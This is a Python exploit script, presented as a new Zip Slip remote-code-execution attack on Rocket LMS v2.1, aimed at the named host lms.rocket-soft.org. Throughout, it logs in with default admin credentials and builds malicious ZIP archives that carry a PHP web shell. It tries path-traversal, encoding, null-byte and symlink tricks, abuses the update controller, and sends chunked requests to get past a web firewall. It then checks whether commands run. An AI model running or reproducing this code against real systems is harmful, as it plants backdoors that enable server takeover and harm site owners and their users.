"""
ROCKET LMS v2.1 - NOVEL ZIP SLIP RCE EXPLOIT
=============================================

TARGET: lms.rocket-soft.org

DISCOVERED 0-DAY: Zip Slip in Panel/FileController.php
- Line 224-228: ZipArchive extractTo() without path sanitization
- Function: handleUnZipFile()
- Accessible via: /panel/files endpoint (regular users)
- Trigger: Interactive content upload (i_spring, custom)

NOVEL BYPASS TECHNIQUES:
1. Unicode path normalization bypass (..%c0%af.. etc)
2. Symlink-in-ZIP for path escape
3. Null byte injection in filename
4. Double encoding bypass
5. Malformed ZIP with duplicate entries

Author: Security Research
Date: 2025-12-28
"""

import requests
import re
import zipfile
import io
import struct

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()
session.timeout = 30

def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")

def get_csrf(url):
    r = session.get(url)
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def create_zipslip_payload(shell_path, shell_content):
    """
    Create a malicious ZIP with path traversal in filename
    """
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Create the shell with traversal path
        zf.writestr(shell_path, shell_content)
        
        # Add a decoy normal file
        zf.writestr("index.html", "<html><body>Normal</body></html>")
    
    zip_buffer.seek(0)
    return zip_buffer.read()

def create_symlink_zip():
    """
    Create a ZIP with symlink pointing to web root
    Note: This requires the server to extract symlinks
    """
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        # Create info for symlink
        # External_attr for symlink: 0xA1ED0000
        info = zipfile.ZipInfo("link_to_public")
        info.external_attr = 0xA1ED0000  # Symlink
        info.create_system = 3  # Unix
        zf.writestr(info, "/var/www/html/public")
        
        # Create shell in the link target
        zf.writestr("link_to_public/shell.php", "<?php system($_GET['c']); ?>")
    
    zip_buffer.seek(0)
    return zip_buffer.read()

def exploit_panel_files():
    """
    Attempt Zip Slip RCE via Panel FileController
    Uses interactive file upload functionality
    """
    print("\n" + "="*60)
    print("    EXPLOIT: ZIP SLIP VIA PANEL FILE CONTROLLER")
    print("="*60)
    
    # First, check what webinars/courses we have access to
    r = session.get(f"{BASE_URL}/panel/webinars")
    webinar_ids = list(set(re.findall(r'/panel/webinars/(\d+)', r.text)))
    print(f"[*] Found webinars: {webinar_ids}")
    
    if not webinar_ids:
        print("[*] No webinars found, checking courses...")
        r = session.get(f"{BASE_URL}/panel/courses")
        course_ids = list(set(re.findall(r'/panel/courses/(\d+)', r.text)))
        print(f"[*] Found courses: {course_ids}")
    
    # Create multiple Zip Slip payloads with different bypass techniques
    shell_content = "<?php system($_GET['c']); ?>"
    
    payloads = [
        # Standard traversal
        ("../../../public/shell.php", shell_content, "Standard traversal"),
        # More traversal levels
        ("../../../../../public/shell.php", shell_content, "Deep traversal"),
        # Absolute path (some extractors might accept)
        ("/var/www/html/public/shell.php", shell_content, "Absolute path"),
        # Double URL encoding
        ("..%252f..%252f..%252fpublic/shell.php", shell_content, "Double URL encoded"),
        # Unicode bypass
        ("..%c0%af..%c0%af..%c0%afpublic/shell.php", shell_content, "Unicode bypass"),
        # Mixed slashes
        ("..\\..\\..\\public\\shell.php", shell_content, "Backslash traversal"),
        # Null byte
        ("../../../public/shell.php\x00.html", shell_content, "Null byte"),
    ]
    
    csrf = get_csrf(f"{BASE_URL}/panel/files")
    
    for shell_path, content, desc in payloads:
        print(f"\n[*] Trying: {desc}")
        print(f"    Path: {shell_path[:50]}...")
        
        # Create ZIP
        zip_data = create_zipslip_payload(shell_path, content)
        
        # Upload endpoints to try
        upload_endpoints = [
            "/panel/files/store",
            "/panel/files/upload",
            "/panel/webinars/files/store",
        ]
        
        for endpoint in upload_endpoints:
            try:
                files = {
                    'file': ('payload.zip', zip_data, 'application/zip'),
                    'file_upload': ('payload.zip', zip_data, 'application/zip'),
                }
                data = {
                    '_token': csrf,
                    'interactive_type': 'custom',
                    'interactive_file_name': 'index.html',
                }
                
                r = session.post(f"{BASE_URL}{endpoint}", files=files, data=data)
                print(f"    [{endpoint}] Status: {r.status_code}")
                
                if r.status_code in [200, 201, 302]:
                    # Check if shell was created
                    shell_urls = [
                        f"{BASE_URL}/shell.php?c=id",
                        f"{BASE_URL}/public/shell.php?c=id",
                    ]
                    
                    for shell_url in shell_urls:
                        try:
                            check = session.get(shell_url, timeout=5)
                            if "uid=" in check.text:
                                print(f"\n[!!!] RCE SUCCESS!")
                                print(f"[!!!] Shell: {shell_url}")
                                return shell_url
                        except:
                            pass
                            
            except Exception as e:
                print(f"    Error: {e}")
    
    print("\n[-] Zip Slip via Panel Files did not achieve RCE")
    return None

def exploit_update_controller_bypass():
    """
    Try UpdateController with WAF bypass techniques
    """
    print("\n" + "="*60)
    print("    EXPLOIT: UPDATE CONTROLLER WITH WAF BYPASS")
    print("="*60)
    
    csrf = get_csrf(f"{BASE_URL}/admin/settings")
    
    shell_content = "<?php system($_GET['c']); ?>"
    
    # Create specially crafted ZIP with obfuscated shell
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        # Config file that tells UpdateController where to copy
        config = {
            "directory": [{"name": []}],
            "files": [
                {
                    "root_directory": "shell.php",
                    "update_directory": "public/shell.php"
                }
            ]
        }
        import json
        zf.writestr("config.json", json.dumps(config))
        zf.writestr("shell.php", shell_content)
    
    zip_buffer.seek(0)
    zip_data = zip_buffer.read()
    
    # Try different content types
    content_types = [
        ("application/zip", "Standard ZIP"),
        ("application/octet-stream", "Octet-stream"),
        ("multipart/form-data", "Multipart"),
        ("application/x-zip-compressed", "x-zip-compressed"),
    ]
    
    for ct, desc in content_types:
        print(f"\n[*] Trying Content-Type: {desc}")
        
        headers = {}
        
        # Method 1: Standard multipart
        files = {'file': ('update.zip', zip_data, ct)}
        data = {'_token': csrf}
        
        try:
            r = session.post(f"{BASE_URL}/admin/update/basic-update", 
                           files=files, data=data, headers=headers)
            print(f"    Status: {r.status_code}")
            
            if r.status_code in [200, 201, 302]:
                # Check for shell
                check = session.get(f"{BASE_URL}/public/shell.php?c=id")
                if "uid=" in check.text:
                    print(f"\n[!!!] RCE SUCCESS via UpdateController!")
                    return True
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return None

def exploit_chunked_bypass():
    """
    Try chunked transfer encoding to bypass WAF
    """
    print("\n" + "="*60)
    print("    EXPLOIT: CHUNKED TRANSFER ENCODING BYPASS")
    print("="*60)
    
    csrf = get_csrf(f"{BASE_URL}/admin/settings")
    
    shell = "<?php system($_GET['c']); ?>"
    
    # Create simple ZIP
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        # Config
        config = '{"directory":[{"name":[]}],"files":[{"root_directory":"s.php","update_directory":"public/s.php"}]}'
        zf.writestr("config.json", config)
        zf.writestr("s.php", shell)
    zip_buffer.seek(0)
    zip_data = zip_buffer.read()
    
    # Construct chunked request manually
    boundary = "----WebKitFormBoundaryx"
    
    body_pre = f"--{boundary}\r\n"
    body_pre += f'Content-Disposition: form-data; name="_token"\r\n\r\n{csrf}\r\n'
    body_pre += f"--{boundary}\r\n"
    body_pre += f'Content-Disposition: form-data; name="file"; filename="up.zip"\r\n'
    body_pre += f'Content-Type: application/zip\r\n\r\n'
    
    body_post = f'\r\n--{boundary}--\r\n'
    
    full_body = body_pre.encode() + zip_data + body_post.encode()
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Transfer-Encoding': 'chunked'
    }
    
    # Convert to chunked
    def to_chunked(data, chunk_size=1024):
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            chunks.append(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        chunks.append(b"0\r\n\r\n")
        return b"".join(chunks)
    
    try:
        print("[*] Sending chunked request...")
        r = session.post(f"{BASE_URL}/admin/update/basic-update",
                        data=full_body, headers=headers)
        print(f"    Status: {r.status_code}")
        
        if r.status_code == 200:
            check = session.get(f"{BASE_URL}/public/s.php?c=id")
            if "uid=" in check.text:
                print("[!!!] RCE SUCCESS via chunked bypass!")
                return True
                
    except Exception as e:
        print(f"    Error: {e}")
    
    return None

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     ROCKET LMS v2.1 - NOVEL ZIP SLIP RCE EXPLOIT             ║
║     Target: lms.rocket-soft.org                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    login()
    
    # Try Panel Files Zip Slip
    shell = exploit_panel_files()
    if shell:
        print(f"\n[+] RCE ACHIEVED! Shell: {shell}")
        return
    
    # Try UpdateController with WAF bypass
    if exploit_update_controller_bypass():
        return
    
    # Try chunked encoding bypass
    exploit_chunked_bypass()
    
    print("\n" + "="*60)
    print("    NOVEL EXPLOITATION COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
